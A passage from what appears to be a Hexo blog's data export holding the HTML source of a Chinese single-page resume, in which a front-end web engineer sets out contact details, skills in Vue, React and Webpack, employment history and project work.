glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：富通App是一款供保险代理人使用，向代理人提供竞赛、预约、宣传、业绩查询、消 息接收等功能\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、根据UI提供的设计稿转换为适配移动端的H5页面</p>\n          <p class=\"values\">2、通过webview实现js与原生交互，让内嵌H5可以调用客户端的原生方法</p>\n          <p class=\"values\">3、在APP中，通过videojs实现视频播放，以及使用echarts实现数据可视化</p>\n          <p class=\"values\">4、开发前端通用的按钮组件、弹框组件和日历组件</p>\n          <p class=\"values\">5、webpack打包优化，以及后期的性能优化等</p>\n        </div>\n      </div>\n      <br />\n      <!-- 33333333333 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">IPF摄影器材租赁系统：2018.1 – 2018.8</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：IPF摄影器材租赁系统是一款后端管理平台，向用户租赁各种摄影器材，主要包括登录、商品管理、用户管理、订单管理等。\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">\n            1、负责web产品页面制作，根据产品需求，制定管理系统的UI风格，实现用户交互的效果；\n          </p>\n          <p class=\"values\">\n            2、持续优化前端体验和页面响应速度，提升web界面友好易用；\n          </p>\n          <p class=\"values\">\n            3、与产品经理、UI设计师及开发经理沟通，理解需求，进行敏捷开发、持续交付和验证；\n          </p>\n          <p class=\"values\">\n            4、完成一些推广的H5页面，如活动介绍，公司月报总结等；\n          </p>\n          <p class=\"values\">\n            5、帮助其他同事进行部分页面的调试，负责后期的性能优化。\n          </p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 自我评价 -->\n    <div id=\"res-skill\" class=\"res-skill footer\">\n      <!-- 小标题 -->\n      <div class=\"row\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          自我评价\n        </h4>\n      </div>\n      <!-- 内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 一、</span> -->\n          <span class=\"values\">\n            本人性格开朗，有良好的沟通能力和团队协作精神，具有良好的业务理解能力，能够独立解决工作中遇到的问题；\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 二、</span> -->\n          <span class=\"values\">\n            热爱编程，喜欢专研新技术，不断突破技术瓶颈，遇到问题一查到底，乐于记笔记、写博客；\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 三、</span> -->\n          <span class=\"values\">\n            喜欢前端，热爱互联网行业，关注前沿技术，能够保持不断学习的决心和动力。\n          </span>\n        </div>\n      </div>\n    </div>\n\n    <!-- <script src=\"assets/jquery/jquery.1.12.4.min.js\"></script>\n    <script src=\"assets/bootstrap/js/bootstrap.min.js\"></script> -->\n    <script src=\"https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js\"></script>\n    <!-- <script src=\"js/index.js\"></script> -->\n  </body>\n</html>\n","source":"hireme/index.html","raw":"---\nlayout: false\ncomments: false\n---\n\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta\n      name=\"viewport\"\n      content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"\n    />\n    <meta name=\"keywords\" content=\"简历\" />\n    <meta name=\"description\" content=\"单页简历\" />\n    <meta name=\"author\" content=\"houfee\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\n    <meta charset=\"UTF-8\" />\n    <title>我的简历</title>\n    <!-- <link rel=\"stylesheet\" href=\"assets/bootstrap/css/bootstrap.css\"> -->\n    <!-- Bootstrap -->\n    <link\n      href=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css\"\n      rel=\"stylesheet\"\n    />\n    <link rel=\"stylesheet\" href=\"fonts/iconfont/iconfont.css\" />\n    <!-- [if lt IE 9]\n  <script src=\"assets/html5shiv/html5shiv.min.js\"></script>\n  <script src=\"assets/respond/respond.min.js\"></script>\n  [endif] -->\n    <!--[if lt IE 9]>\n      <script src=\"https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js\"></script>\n      <script src=\"https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js\"></script>\n    <![endif]-->\n    <link rel=\"stylesheet\" href=\"css/index.css\" />\n  </head>\n\n  <body class=\"container\">\n    <!-- 导航栏 -->\n    <!-- <nav class=\"res-navbar\">\n    <div class=\"navbar-header\">\n      <button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#bs-example-navbar-collapse-1\">\n        <span class=\"icon-bar\"></span>\n        <span class=\"icon-bar\"></span>\n        <span class=\"icon-bar\"></span>\n      </button>\n      <span class=\"navbar-brand\">\n        <span class=\"iconfont icon-zhaopin\"></span>\n      </span>\n    </div>\n    <div class=\"collapse navbar-collapse\" id=\"bs-example-navbar-collapse-1\">\n      <ul class=\"nav navbar-nav\">\n        <li class=\"active\"><a href=\"#res-introduce\">个人介绍</a></li>\n        <li><a href=\"#res-skill\">技能展示</a></li>\n        <li><a href=\"#res-company\">工作经历</a></li>\n        <li><a href=\"#res-project\">项目经验</a></li>\n        <li><a href=\"#res-skill\">自我评价</a></li>\n      </ul>\n      <ul class=\"nav navbar-nav navbar-right hidden-sm\">\n        <li><a href=\"https://houfee.github.io/\">我的博客</a></li>\n      </ul>\n    </div>\n  </nav> -->\n\n    <!-- 个人介绍 -->\n    <div id=\"res-introduce\" class=\"res-introduce\">\n      <!-- 头像部分 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12 col-sm-3 avatar-box\">\n          <img class=\"my-avatar\" src=\"./images/timg.jpg\" alt=\"头像\" />\n        </div>\n        <!-- 文字介绍部分 -->\n        <div class=\"col-xs-12 col-sm-9 my-info\">\n          <!-- 第一行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4 items\">姓名：</div>\n              <div class=\"col-xs-8 col-sm-8\">侯飞</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4 items\">年龄：</div>\n              <div class=\"col-xs-8 col-sm-8\">25</div>\n            </div>\n          </div>\n          <!-- 第二行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">籍贯：</div>\n              <div class=\"col-xs-8 col-sm-8\">河北张家口</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">学历：</div>\n              <div class=\"col-xs-8 col-sm-8\">本科</div>\n            </div>\n          </div>\n          <!-- 第三行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">毕业院校：</div>\n              <div class=\"col-xs-8 col-sm-8\">唐山学院</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">毕业时间：</div>\n              <div class=\"col-xs-8 col-sm-8\">2017-07</div>\n            </div>\n          </div>\n          <!-- 第四行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">手机号：</div>\n              <div class=\"col-xs-8 col-sm-8\">13261351763</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">邮箱：</div>\n              <div class=\"col-xs-8 col-sm-8\">allen1710@163.com</div>\n            </div>\n          </div>\n          <!-- 第五行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">工作经验:</div>\n              <div class=\"col-xs-8 col-sm-8\">3年</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">应聘职位：</div>\n              <div class=\"col-xs-8 col-sm-8\">web前端工程师</div>\n            </div>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <!-- 技能展示 -->\n    <div id=\"res-skill\" class=\"res-skill\">\n      <!-- 小标题 -->\n      <div class=\"row\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          职业技能\n        </h4>\n      </div>\n      <!-- 内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            具有三年 Web 开发经验，熟练掌握H5、C3，能够基于scss等拓展语言快速开发，构建出高性 能并且兼容性好的Web应用\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <span class=\"values\">\n            具有扎实的JS基础，并且熟练掌握ES6新语法\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握 Vue、Vue Router、Vuex等相关技术栈，能够根据业务需求封装特定组件\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握Hybird APP开发，对移动端适配和JS与原生交互有一定研究\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            掌握React、Redux，能够基于antd快速开发后台管理系统，有RN开发经验\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握Webpack、Babel和PostCSS，会配置常用的loader和plugin，能够快速构建工程\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            基本熟悉Node，会用Node编写提高工作效率的脚本，会使用Express进行接口开发\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握ESlint配置，并在项目中使用，统一编码规范\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\"> 熟练掌握Git和SVN等版本控制工具的使用</span>\n        </div>\n      </div>\n    </div>\n\n    <!-- 工作经历 -->\n    <div id=\"res-company\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          工作经历\n        </h4>\n      </div>\n      <!-- 公司名 及 工作岗位 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">2018.9-至今</span>\n          <span class=\"items\">中科软科技（web前端工程师）</span>\n        </div>\n      </div>\n      <!-- 岗位职责 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.6 – 至今</span>\n          <p class=\"values\">参与APP独立小应用的开发；</p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.3 – 2019.5</span>\n          <p class=\"values\">负责牙牙预约H5页面的开发工作，并配合后台完成系统升级；</p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2018.9 – 2019.2</span>\n          <p class=\"values\">负责Hybrid App 开发，负责预约功能、视频播放、大图预览等模块开发</p>\n        </div>\n      </div>\n      <br />\n      <!-- 公司名 及 工作岗位 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">2018.8 - 2017.7</span>\n          <span class=\"items\">北京橙悦科技有限公司（web前端工程师）</span>\n        </div>\n      </div>\n      <!-- 岗位职责 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2018.2 – 2018.8</span>\n          <p class=\"values\">参与摄影器材租赁系统后端管理平台开发工作；负责公司首页开发的开发工作，以及公众号的开发。 </p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2017.8 – 2018.1</span>\n          <p class=\"values\">负责公司首页开发的开发工作，以及公众号的开发。 </p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 练手项目 -->\n    <div id=\"res-project\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          练手项目\n        </h4>\n      </div>\n      <!-- 111111111111111 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2020.2 – 至今&nbsp;&nbsp;&nbsp;Vue移动端的组件库-lightui </span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：一个轻量级的<a href=\"https://github.com/houfee/light-ui\">vue移动端组件库</a>\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、 升级vue-cli2依赖包，包括babel、webpack以及其他loader</p>\n          <p class=\"values\">\n            2、 参考cube-ui的打包模式，依赖一套package，构建生成组件模块、\n            <a href=\"https://houfee.github.io/light-ui/example/#/\">example</a>和\n            <a href=\"https://houfee.github.io/light-ui/#/zh-CN\">文档网址</a>\n          </p>\n          <p class=\"values\">3、 参考element-ui的scss设计思想，并在项目中使用</p>\n          <p class=\"values\">4、 将现有的vue组件库的优秀组件添加到lightui中。</p>\n        </div>\n      </div>\n      <br />\n      <!-- 44444444444444 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.10 – 2020.1&nbsp;&nbsp;&nbsp;react后台管理项目</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：后台管理项目，包括\n            <a href=\"http://49.235.41.140:8080/#/login\">用户登录</a>、\n            <a href=\"http://49.235.41.140:8080/#/home\">首页</a>、\n            <a href=\"http://49.235.41.140:8080/#/category\">商品管理</a>、\n            <a href=\"http://49.235.41.140:8080/#/user\">用户管理</a>以及\n            <a href=\"http://49.235.41.140:8080/#/charts/bar\">图形图标</a>等模块\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、使用antd组件库搭建项目结构，完成该项目的用户管理，首页等多个模块的开发</p>\n          <p class=\"values\">2、通过jsonp方式请求第三方天气接口，为项目添加天气模块</p>\n          <p class=\"values\">3、使用echarts添加可视化图形模块，使用draftjs-to-html为项目添加富文本编辑器</p>\n          <p class=\"values\">4、使用redux进行状态管理</p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 项目经验 -->\n    <div id=\"res-project\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          项目经验\n        </h4>\n      </div>\n      <!-- 111111111111111 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">APP小应用开发：2019.6 – 至今</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：完成多个功能的小应用开发，包括预约、详情、评价、内容介绍等任务\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">\n            1、改造vue-cli，使用postcss相关插件完成移动端的适配\n          </p>\n          <p class=\"values\">\n            2、根据业务需求完成公共组件，包括日历选择组件，时间颗粒度选择组件，证件弹框组件等\n          </p>\n          <p class=\"values\">\n            3、通过 vue-router 的生命周期钩子判断不同入口的页面返回以及跳转，并且在该页面销毁时将数 据保存在vuex中\n          </p>\n          <p class=\"values\">\n            4、通过 js 和原生交互，实现原生向页面注数据，以及 js 调取原生的相机、地图、电话等组件，并 且实现页面埋点，统计访问数据\n          </p>\n          <p class=\"values\">5、配合产品完成页面功能改进，提升用户体检</p>\n        </div>\n      </div>\n      <br />\n      <!-- 44444444444444 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">牙牙预约：2019.3 - 2019.5</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：牙牙预约为客户提供牙齿健康预约服务，进行Vue多页面开发，在不同平台有不同的样式风格，以及不同渠道的预约门店等不同\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、将老项目代码从SVN移植到GitLab；相似渠道代码归并，减少代码量</p>\n          <p class=\"values\">2、根据业务需求重构代码，便于用于新渠道开发</p>\n          <p class=\"values\">3、重写并替换项目冗余组件，便于项目维护和移植</p>\n          <p class=\"values\">4、调用高德、腾讯等地图组件，实现定位功能</p>\n          <p class=\"values\">5、配合后端同事完成数据优化以及实现新需求</p>\n        </div>\n      </div>\n      <br />\n      <!-- 2222222222222222222 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">富通App：2018.9 – 2019.2</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：富通App是一款供保险代理人使用，向代理人提供竞赛、预约、宣传、业绩查询、消 息接收等功能\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、根据UI提供的设计稿转换为适配移动端的H5页面</p>\n          <p class=\"values\">2、通过webview实现js与原生交互，让内嵌H5可以调用客户端的原生方法</p>\n          <p class=\"values\">3、在APP中，通过videojs实现视频播放，以及使用echarts实现数据可视化</p>\n          <p class=\"values\">4、开发前端通用的按钮组件、弹框组件和日历组件</p>\n          <p class=\"values\">5、webpack打包优化，以及后期的性能优化等</p>\n        </div>\n      </div>\n      <br />\n      <!-- 33333333333 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">IPF摄影器材租赁系统：2018.1 – 2018.8</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：IPF摄影器材租赁系统是一款后端管理平台，向用户租赁各种摄影器材，主要包括登录、商品管理、用户管理、订单管理等。\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">\n            1、负责web产品页面制作，根据产品需求，制定管理系统的UI风格，实现用户交互的效果；\n          </p>\n          <p class=\"values\">\n            2、持续优化前端体验和页面响应速度，提升web界面友好易用；\n          </p>\n          <p class=\"values\">\n            3、与产品经理、UI设计师及开发经理沟通，理解需求，进行敏捷开发、持续交付和验证；\n          </p>\n          <p class=\"values\">\n            4、完成一些推广的H5页面，如活动介绍，公司月报总结等；\n          </p>\n          <p class=\"values\">\n            5、帮助其他同事进行部分页面的调试，负责后期的性能优化。\n          </p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 自我评价 -->\n    <div id=\"res-skill\" class=\"res-skill footer\">\n      <!-- 小标题 -->\n      <div class=\"row\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          自我评价\n        </h4>\n      </div>\n      <!-- 内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 一、</span> -->\n          <span class=\"values\">\n            本人性格开朗，有良好的沟通能力和团队协作精神，具有良好的业务理解能力，能够独立解决工作中遇到的问题；\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 二、</span> -->\n          <span class=\"values\">\n            热爱编程，喜欢专研新技术，不断突破技术瓶颈，遇到问题一查到底，乐于记笔记、写博客；\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 三、</span> -->\n          <span class=\"values\">\n            喜欢前端，热爱互联网行业，关注前沿技术，能够保持不断学习的决心和动力。\n          </span>\n        </div>\n      </div>\n    </div>\n\n    <!-- <script src=\"assets/jquery/jquery.1.12.4.min.js\"></script>\n    <script src=\"assets/bootstrap/js/bootstrap.min.js\"></script> -->\n    <script src=\"https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js\"></script>\n    <!-- <script src=\"js/index.js\"></script> -->\n  </body>\n</html>\n","date":"2020-06-18T07:09:21.448Z","updated":"2020-06-18T07:09:21.448Z","path":"hireme/index.html","title":"","_id":"ckclr4u5p000vqrwtrpgck7a7","content":"\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head><meta name=\"generator\" content=\"Hexo 3.8.0\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\n    <meta name=\"keywords\" content=\"简历\">\n    <meta name=\"description\" content=\"单页简历\">\n    <meta name=\"author\" content=\"houfee\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <meta charset=\"UTF-8\">\n    <title>我的简历</title>\n    <!-- <link rel=\"stylesheet\" href=\"assets/bootstrap/css/bootstrap.css\"> -->\n    <!-- Bootstrap -->\n    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css\" rel=\"stylesheet\">\n    <link rel=\"stylesheet\" href=\"fonts/iconfont/iconfont.css\">\n    <!-- [if lt IE 9]\n  <script src=\"assets/html5shiv/html5shiv.min.js\"></script>\n  <script src=\"assets/respond/respond.min.js\"></script>\n  [endif] -->\n    <!--[if lt IE 9]>\n      <script src=\"https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js\"></script>\n      <script src=\"https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js\"></script>\n    <![endif]-->\n    <link rel=\"stylesheet\" href=\"css/index.css\">\n  </head>\n\n  <body class=\"container\">\n    <!-- 导航栏 -->\n    <!-- <nav class=\"res-navbar\">\n    <div class=\"navbar-header\">\n      <button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#bs-example-navbar-collapse-1\">\n        <span class=\"icon-bar\"></span>\n        <span class=\"icon-bar\"></span>\n        <span class=\"icon-bar\"></span>\n      </button>\n      <span class=\"navbar-brand\">\n        <span class=\"iconfont icon-zhaopin\"></span>\n      </span>\n    </div>\n    <div class=\"collapse navbar-collapse\" id=\"bs-example-navbar-collapse-1\">\n      <ul class=\"nav navbar-nav\">\n        <li class=\"active\"><a href=\"#res-introduce\">个人介绍</a></li>\n        <li><a href=\"#res-skill\">技能展示</a></li>\n        <li><a href=\"#res-company\">工作经历</a></li>\n        <li><a href=\"#res-project\">项目经验</a></li>\n        <li><a href=\"#res-skill\">自我评价</a></li>\n      </ul>\n      <ul class=\"nav navbar-nav navbar-right hidden-sm\">\n        <li><a href=\"https://houfee.github.io/\">我的博客</a></li>\n      </ul>\n    </div>\n  </nav> -->\n\n    <!-- 个人介绍 -->\n    <div id=\"res-introduce\" class=\"res-introduce\">\n      <!-- 头像部分 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12 col-sm-3 avatar-box\">\n          <img class=\"my-avatar\" src=\"./images/timg.jpg\" alt=\"头像\">\n        </div>\n        <!-- 文字介绍部分 -->\n        <div class=\"col-xs-12 col-sm-9 my-info\">\n          <!-- 第一行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4 items\">姓名：</div>\n              <div class=\"col-xs-8 col-sm-8\">侯飞</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4 items\">年龄：</div>\n              <div class=\"col-xs-8 col-sm-8\">25</div>\n            </div>\n          </div>\n          <!-- 第二行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">籍贯：</div>\n              <div class=\"col-xs-8 col-sm-8\">河北张家口</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">学历：</div>\n              <div class=\"col-xs-8 col-sm-8\">本科</div>\n            </div>\n          </div>\n          <!-- 第三行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">毕业院校：</div>\n              <div class=\"col-xs-8 col-sm-8\">唐山学院</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">毕业时间：</div>\n              <div class=\"col-xs-8 col-sm-8\">2017-07</div>\n            </div>\n          </div>\n          <!-- 第四行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">手机号：</div>\n              <div class=\"col-xs-8 col-sm-8\">13261351763</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">邮箱：</div>\n              <div class=\"col-xs-8 col-sm-8\">allen1710@163.com</div>\n            </div>\n          </div>\n          <!-- 第五行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">工作经验:</div>\n              <div class=\"col-xs-8 col-sm-8\">3年</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">应聘职位：</div>\n              <div class=\"col-xs-8 col-sm-8\">web前端工程师</div>\n            </div>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <!-- 技能展示 -->\n    <div id=\"res-skill\" class=\"res-skill\">\n      <!-- 小标题 -->\n      <div class=\"row\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon 